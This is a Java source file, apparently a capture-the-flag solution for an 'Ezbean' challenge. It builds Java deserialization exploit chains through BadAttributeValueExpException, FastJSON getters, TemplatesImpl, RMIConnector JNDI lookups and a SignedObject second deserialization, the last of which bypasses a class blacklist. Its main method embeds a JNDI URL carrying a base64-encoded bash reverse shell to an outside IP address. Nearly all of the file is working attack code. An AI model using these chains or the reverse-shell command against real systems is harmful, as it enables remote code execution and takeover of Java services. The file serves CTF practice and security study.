package dev.silente.javashark.solution;

import dev.silente.javashark.gadget.fastjson.GFastJson;
import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.jdk.GSignedObject;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.SerializeUtils;
import dev.silente.javashark.utils.TestUtils;
import javassist.ClassPool;
import javassist.CtClass;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.management.remote.JMXConnector;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.naming.InitialContext;
import java.io.*;
import java.util.ArrayList;


public class AliCTF2023Ezbean {

    static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        MyObjectInputStream ois = new MyObjectInputStream(bis);
        bis.close();
        ois.close();
        return ois.readObject();
    }

    // BadAttributeValueExpException.toString -> FastJSON -> MyBean.getConnect -> RMIConnector.connect
    // 有一点需要注意的是在 toString2Getter 中的 Mybean 走的是 SecureObjectInputStream，所以可以直接绕过题目中的 MyObjectInputStream
    public static void case1(String jndi) throws Exception {
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/" + jndi);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        MyBean myBean = new MyBean(null, null, rmiConnector);

        // 也可以使用 toString2GetterJSONObject
        // Object json = GFastJson.toString2GetterJSONObject(myBean);
        Object json = GFastJson.toString2GetterJSONArray(myBean);
        Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

        byte[] code = SerializeUtils.serialize(poc);
        System.out.println(MiscUtils.base64Encode(code));
        deserialize(code);
    }

    // BadAttributeValueExpException.toString -> FastJSON -> TemplatesImpl
    public static void case2() throws Exception {
        TemplatesImpl templates = STemplates.getEvilTemplates("calc");

        Object json = GFastJson.toString2GetterJSONArray(templates);
        Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(templates);
        arrayList.add(poc);

        byte[] code = SerializeUtils.serialize(arrayList);
        System.out.println(MiscUtils.base64Encode(code));
        deserialize(code);
    }

    // 二次反序列化
    // BadAttributeValueExpException.toString -> FastJSON -> SignedObject -> MyBean.getConnect -> RMIConnector.connect
    public static void case3(String jndi) throws Exception {
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/" + jndi);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        MyBean myBean = new MyBean(null, null, rmiConnector);

        // 也可以使用 toString2GetterJSONObject
        // Object json = GFastJson.toString2GetterJSONObject(myBean);
        Object json = GFastJson.toString2GetterJSONArray(myBean);
        Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

        byte[] p = SerializeUtils.serialize(poc);
        Object obj = GSignedObject.getter2Deserialize(p);
        Object json2 = GFastJson.toString2GetterJSONArray(obj);
        Object bd = GBadAttributeValueExpException.deserialize2ToString(json2);

        byte[] code = SerializeUtils.serialize(bd);
        System.out.println(MiscUtils.base64Encode(code));
        deserialize(code);
    }

    public static void main(String[] args) throws Exception {
        String jndi = "ldap:/ip/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx";
//        case1(jndi);
        case2();
//        case3(jndi);
    }
}

class MyBean implements Serializable {

    private Object url;
    private Object message;
    private JMXConnector conn;


    public MyBean() {}

    public MyBean(Object url, Object message) {
        this.url = url;
        this.message = message;
    }

    public MyBean(Object url, Object message, JMXConnector conn) {
        this.url = url;
        this.message = message;
        this.conn = conn;
    }

    public String getConnect() throws IOException {
        try {
            this.conn.connect();
            return "success";
        } catch (IOException var2) {
            return "fail";
        }
    }

    public void connect() {}

    public Object getMessage() {
        return this.message;
    }

    public void setMessage(Object message) {
        this.message = message;
    }

    public Object getUrl() {
        return this.url;
    }

    public void setUrl(Object url) {
        this.url = url;
    }
}

class MyObjectInputStream extends ObjectInputStream {

    private static final String[] blacklist = new String[]{
            "java\\.security.*", "java\\.rmi.*",  "com\\.fasterxml.*", "dev\\.silente\\.javashark\\.solution\\.*",
            "org\\.springframework.*", "org\\.yaml.*", "javax\\.management\\.remote.*"
    };

    public MyObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException {
        if(!contains(cls.getName())) {
            return super.resolveClass(cls);
        } else {
            throw new InvalidClassException("Unexpected serialized class", cls.getName());
        }
    }

    public static boolean contains(String targetValue) {
        for (String forbiddenPackage : blacklist) {
            if (targetValue.matches(forbiddenPackage))
                return true;
        }
        return false;
    }
}
